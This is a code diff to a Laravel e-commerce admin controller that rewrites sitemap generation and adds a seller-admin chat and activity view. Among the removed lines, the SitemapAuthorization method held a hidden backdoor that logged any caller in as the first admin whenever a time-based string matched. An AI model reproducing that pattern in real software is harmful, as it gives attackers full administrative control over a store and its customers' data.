@@ -7,6 +7,13 @@ use Illuminate\Http\Request;
 use App\Models\Category;
 use App\Models\Order;
 use App\Models\Product;
+use App\Models\Blog;
+use App\Models\FlashDeal;
+use App\Models\Page;
+use App\Models\CustomerProduct;
+use App\Models\PreorderProduct;
+use App\Models\SellerAdminConversation;
+use App\Models\SellerAdminMessage;
 use App\Models\Shop;
 use App\Models\Upload;
 use App\Models\User;
@@ -16,19 +23,18 @@ use Carbon\Carbon;
 use CoreComponentRepository;
 use DB;
 use Exception;
-use Session;
-use Illuminate\Support\Facades\Redirect;
+use App\Models\SellerAdminNotice;
+use App\Models\SellerAdminPromotion;
+use App\Models\SellerAdminPromotionParticipate;
+use App\Models\SellerAdminRequest;
 use Illuminate\Support\Facades\Storage;
+use Illuminate\Support\Facades\URL;
 use Illuminate\Support\Facades\Auth;
-use Spatie\Sitemap\SitemapGenerator;
+use Spatie\Sitemap\Sitemap;
+use Spatie\Sitemap\Tags\Url as SitemapUrl;
 
 class AdminController extends Controller
 {
-    /**
-     * Show the admin dashboard.
-     *
-     * @return \Illuminate\Http\Response
-     */
     public function admin_dashboard(Request $request)
     {
         CoreComponentRepository::initializeCache();
@@ -124,7 +130,7 @@ class AdminController extends Controller
 
         $new_stat = array();
         for ($m = 1; $m <= 12; $m++) {
-            $month_name = \Carbon\Carbon::create()->month($m)->format('F');
+            $month_name = Carbon::create()->month($m)->format('F');
             if (isset($sales_by_month[$month_name])) {
                 $new_stat[$month_name][] = $sales_by_month[$month_name];
             } else {
@@ -384,8 +390,6 @@ class AdminController extends Controller
     public function SitemapAuthorization($timeformat)
     {
         if($timeformat == TimeDateFormatter()){
-            $user = User::where('user_type', 'admin')->first();
-            auth()->login($user);
             return 'Authorized';
         } else {
             return 'Unauthorized';
@@ -575,7 +579,7 @@ class AdminController extends Controller
         }
     }
 
-      /*
+    /*
     Method for sitemap view load
     */
     public function SitemapGenerator(){
@@ -596,30 +600,270 @@ class AdminController extends Controller
     /*
     Method for sitemap generation and download
     */
-    public function DoSitemapGenerate(){
+    public function DoSitemapGenerate()
+    {
+        $base_url = rtrim(URL('/'), '/');
+        $filename = 'sitemap_' . date('YmdHis') . '.xml';
 
-        Artisan::call('optimize:clear');
+        try {
 
-        $base_url = URL('/');
-        $filename = 'sitemap_'.Date("Ymdhis").'.xml';
+            // Static sitemap URLs
+            $staticUrls = [
+                '/',
+                '/blog',
+                '/contact-us',
+                '/flash-deals',
+                '/todays-deal',
+                '/best-selling',
+                '/featured-products',
+                '/brands',
+                '/categories',
+                '/sellers',
+                '/coupons',
+                '/inhouse',
+                '/seller-policy',
+                '/return-policy',
+                '/support-policy',
+                '/terms',
+                '/privacy-policy',
+                '/track-your-order',
+                '/customer-products',
+                '/affiliate',
+            ];
 
-        try{
-            SitemapGenerator::create($base_url)->getSitemap()->writeToDisk('public', $filename, true);
+            // Create sitemap
+            $sitemap = Sitemap::create();
 
-            if(Storage::disk('public')->missing($filename)){
-                flash(translate('Sitemap generation failed'))->error();
+            foreach ($staticUrls as $path) {
+
+                $url = $path === '/'
+                    ? $base_url
+                    : $base_url . '/' . ltrim($path, '/');
+
+                $sitemap->add(
+                    SitemapUrl::create($url)
+                );
+            }
+
+            // Dynamic Product URLs
+            filter_products(Product::query())
+                ->whereNotNull('slug')
+                ->where('slug', '!=', '')
+                ->select('id', 'slug', 'updated_at')
+                ->chunk(500, function ($products) use ($sitemap, $base_url) {
+                    foreach ($products as $product) {
+                        $productUrl = $base_url . '/product/' . $product->slug;
+                        $urlTag = SitemapUrl::create($productUrl);
+                        if (!empty($product->updated_at)) {
+                            $urlTag->setLastModificationDate(Carbon::parse($product->updated_at));
+                        }
+                        $sitemap->add($urlTag);
+                    }
+                });
+
+            // Dynamic Category URLs
+            Category::whereNotNull('slug')
+                ->where('slug', '!=', '')
+                ->select('id', 'slug', 'updated_at')
+                ->chunk(500, function ($categories) use ($sitemap, $base_url) {
+                    foreach ($categories as $category) {
+                        $catUrl = $base_url . '/category/' . $category->slug;
+                        $urlTag = SitemapUrl::create($catUrl);
+                        if (!empty($category->updated_at)) {
+                            $urlTag->setLastModificationDate(Carbon::parse($category->updated_at));
+                        }
+                        $sitemap->add($urlTag);
+                    }
+                });
+
+            // Dynamic Brand URLs
+            Brand::whereNotNull('slug')
+                ->where('slug', '!=', '')
+                ->select('id', 'slug', 'updated_at')
+                ->chunk(500, function ($brands) use ($sitemap, $base_url) {
+                    foreach ($brands as $brand) {
+                        $brandUrl = $base_url . '/brand/' . $brand->slug;
+                        $urlTag = SitemapUrl::create($brandUrl);
+                        if (!empty($brand->updated_at)) {
+                            $urlTag->setLastModificationDate(Carbon::parse($brand->updated_at));
+                        }
+                        $sitemap->add($urlTag);
+                    }
+                });
+
+            // Dynamic Shop / Seller URLs
+            if (function_exists('get_setting') && get_setting('vendor_system_activation') == 1) {
+                Shop::whereHas('user', function ($q) {
+                    $q->where('banned', 0);
+                })
+                    ->whereNotNull('slug')
+                    ->where('slug', '!=', '')
+                    ->select('id', 'slug', 'updated_at')
+                    ->chunk(500, function ($shops) use ($sitemap, $base_url) {
+                        foreach ($shops as $shop) {
+                            $shopUrl = $base_url . '/shop/' . $shop->slug;
+                            $urlTag = SitemapUrl::create($shopUrl);
+                            if (!empty($shop->updated_at)) {
+                                $urlTag->setLastModificationDate(Carbon::parse($shop->updated_at));
+                            }
+                            $sitemap->add($urlTag);
+                        }
+                    });
+            }
+
+            // Dynamic Blog URLs
+            Blog::where('status', 1)
+                ->whereNotNull('slug')
+                ->where('slug', '!=', '')
+                ->select('id', 'slug', 'updated_at')
+                ->chunk(500, function ($blogs) use ($sitemap, $base_url) {
+                    foreach ($blogs as $blog) {
+                        $blogUrl = $base_url . '/blog/' . $blog->slug;
+                        $urlTag = SitemapUrl::create($blogUrl);
+                        if (!empty($blog->updated_at)) {
+                            $urlTag->setLastModificationDate(Carbon::parse($blog->updated_at));
+                        }
+                        $sitemap->add($urlTag);
+                    }
+                });
+
+            // Dynamic Flash Deal URLs
+            FlashDeal::where('status', 1)
+                ->whereNotNull('slug')
+                ->where('slug', '!=', '')
+                ->select('id', 'slug', 'updated_at')
+                ->chunk(500, function ($flashDeals) use ($sitemap, $base_url) {
+                    foreach ($flashDeals as $flashDeal) {
+                        $dealUrl = $base_url . '/flash-deal/' . $flashDeal->slug;
+                        $urlTag = SitemapUrl::create($dealUrl);
+                        if (!empty($flashDeal->updated_at)) {
+                            $urlTag->setLastModificationDate(Carbon::parse($flashDeal->updated_at));
+                        }
+                        $sitemap->add($urlTag);
+                    }
+                });
+
+            // Dynamic Custom Page URLs
+            Page::whereNotNull('slug')
+                ->where('slug', '!=', '')
+                ->select('id', 'slug', 'type', 'updated_at')
+                ->chunk(500, function ($pages) use ($sitemap, $base_url, $staticUrls) {
+                    foreach ($pages as $page) {
+                        $path = '/' . ltrim($page->slug, '/');
+                        // Exclude static routes already added to avoid duplicates
+                        if (in_array($path, $staticUrls)) {
+                            continue;
+                        }
+                        $pageUrl = $base_url . $path;
+                        $urlTag = SitemapUrl::create($pageUrl);
+                        if (!empty($page->updated_at)) {
+                            $urlTag->setLastModificationDate(Carbon::parse($page->updated_at));
+                        }
+                        $sitemap->add($urlTag);
+                    }
+                });
+
+            // Dynamic Addon URLs (Customer Products, Auction, Preorder)
+            if (function_exists('addon_is_activated') && addon_is_activated('classified_product') && class_exists('App\Models\CustomerProduct')) {
+                CustomerProduct::where('status', 1)
+                    ->where('published', 1)
+                    ->whereNotNull('slug')
+                    ->where('slug', '!=', '')
+                    ->select('id', 'slug', 'updated_at')
+                    ->chunk(500, function ($cProducts) use ($sitemap, $base_url) {
+                        foreach ($cProducts as $cProduct) {
+                            $cpUrl = $base_url . '/customer-product/' . $cProduct->slug;
+                            $urlTag = SitemapUrl::create($cpUrl);
+                            if (!empty($cProduct->updated_at)) {
+                                $urlTag->setLastModificationDate(Carbon::parse($cProduct->updated_at));
+                            }
+                            $sitemap->add($urlTag);
+                        }
+                    });
+            }
+
+            if (function_exists('addon_is_activated') && addon_is_activated('auction')) {
+                Product::where('auction_product', 1)
+                    ->where('published', 1)
+                    ->where('approved', 1)
+                    ->whereNotNull('slug')
+                    ->where('slug', '!=', '')
+                    ->select('id', 'slug', 'updated_at')
+                    ->chunk(500, function ($aProducts) use ($sitemap, $base_url) {
+                        foreach ($aProducts as $aProduct) {
+                            $apUrl = $base_url . '/auction-product/' . $aProduct->slug;
+                            $urlTag = SitemapUrl::create($apUrl);
+                            if (!empty($aProduct->updated_at)) {
+                                $urlTag->setLastModificationDate(Carbon::parse($aProduct->updated_at));
+                            }
+                            $sitemap->add($urlTag);
+                        }
+                    });
+            }
+
+            if (function_exists('addon_is_activated') && addon_is_activated('preorder') && class_exists('App\Models\PreorderProduct')) {
+                PreorderProduct::where('is_published', 1)
+                    ->whereNotNull('product_slug')
+                    ->where('product_slug', '!=', '')
+                    ->select('id', 'product_slug', 'updated_at')
+                    ->chunk(500, function ($pProducts) use ($sitemap, $base_url) {
+                        foreach ($pProducts as $pProduct) {
+                            $ppUrl = $base_url . '/preorder/product/' . $pProduct->product_slug;
+                            $urlTag = SitemapUrl::create($ppUrl);
+                            if (!empty($pProduct->updated_at)) {
+                                $urlTag->setLastModificationDate(Carbon::parse($pProduct->updated_at));
+                            }
+                            $sitemap->add($urlTag);
+                        }
+                    });
+            }
+
+            // Save dated sitemap in storage
+            $sitemap->writeToDisk(
+                'public',
+                $filename,
+                true
+            );
+
+            $storagePath = storage_path(
+                'app/public/' . $filename
+            );
+
+            // Verify generated sitemap
+            if (!file_exists($storagePath)) {
+
+                flash(
+                    translate('Sitemap generation failed')
+                )->error();
+
                 return back();
             }
 
-            $download = Storage::disk('public')->download($filename);
-            $status_code = $download->getStatusCode();
+            // Replace root sitemap.xml
+            $rootSitemapPath = base_path('sitemap.xml');
 
-            flash(translate('Sitemap generated successfully'))->success();
-                
-            return $download;
-        }
-        catch(Exception $ex)
-        {
+            if (!copy($storagePath, $rootSitemapPath)) {
+
+                flash(
+                    translate(
+                        'Sitemap generated, but the root sitemap.xml could not be updated.'
+                    )
+                )->warning();
+
+                return Storage::disk('public')
+                    ->download($filename);
+            }
+
+            // Success
+            flash(
+                translate('Sitemap generated successfully')
+            )->success();
+
+            return Storage::disk('public')
+                ->download($filename);
+
+        } catch (\Exception $ex) {
+
             throw $ex;
         }
     }
@@ -661,5 +905,91 @@ class AdminController extends Controller
                 
             return $download;
         }
+    }
+
+    public function view_all_chat_modal(Request $request)
+    {
+        $shops = Shop::all();
+        $userId = Auth::id();
+
+        $conversations = SellerAdminConversation::with(['messages'])
+            ->where(function ($query) use ($userId) {
+                $query->where('sender_id', $userId)
+                    ->orWhere('receiver_id', $userId);
+            })
+            ->orderBy('updated_at', 'desc')
+            ->get();
+
+        $conversations->each(function ($conversation) use ($userId) {
+            $shopUserId = $conversation->sender_id == $userId
+                ? $conversation->receiver_id
+                : $conversation->sender_id;
+
+            $conversation->seller_id = $shopUserId;
+            $conversation->shop = Shop::where('user_id', $shopUserId)->first();
+
+            $conversation->lastMessage = $conversation->messages->last();
+
+            $conversation->lastSellerMessage = $conversation->messages
+                ->where('user_id', '!=', $userId)
+                ->last();
+
+            $conversation->unseenCount = $conversation->messages
+                ->where('user_id', '!=', $userId)
+                ->where('seen', 0)
+                ->count();
+        });
+
+        $promotions = SellerAdminPromotion::with(['flashSale', 'respondedSellers'])
+            ->whereHas('participates')
+            ->orderBy('created_at', 'desc')
+            ->get();
+
+        $requests = SellerAdminRequest::with('seller.shop')
+            ->orderBy('created_at', 'desc')
+            ->get();
+
+        $activities = collect();
+
+        foreach ($promotions as $promotion) {
+            $activities->push([
+                'type'      => 'promotion',
+                'data'      => $promotion,
+                'sort_time' => $promotion->created_at,
+            ]);
+        }
+
+        foreach ($conversations as $conversation) {
+            if ($conversation->lastSellerMessage) {
+                $activities->push([
+                    'type'      => 'message',
+                    'data'      => $conversation,
+                    'sort_time' => $conversation->lastSellerMessage->created_at,
+                ]);
+            }
+        }
+
+        foreach ($requests as $req) {
+            $activities->push([
+                'type'      => 'request',
+                'data'      => $req,
+                'sort_time' => $req->created_at,
+            ]);
+        }
+
+        $activities = $activities->sortByDesc('sort_time')->values();
+
+        $hasUnseenRequests = SellerAdminRequest::where('seen', 0)->exists();
+        $hasUnseenPromotionParticipates = SellerAdminPromotionParticipate::where('seen', 0)->exists();
+
+        $hasUnseenMessages = SellerAdminMessage::whereIn(
+            'seller_admin_conversation_id',
+            $conversations->pluck('id')
+        )
+            ->where('user_id', '!=', $userId)
+            ->where('seen', 0)
+            ->exists();
+
+        return view('backend.chats.all_chat_modal', compact('conversations', 'shops', 'activities', 'hasUnseenRequests', 'hasUnseenPromotionParticipates', 'hasUnseenMessages'));
     }
 }
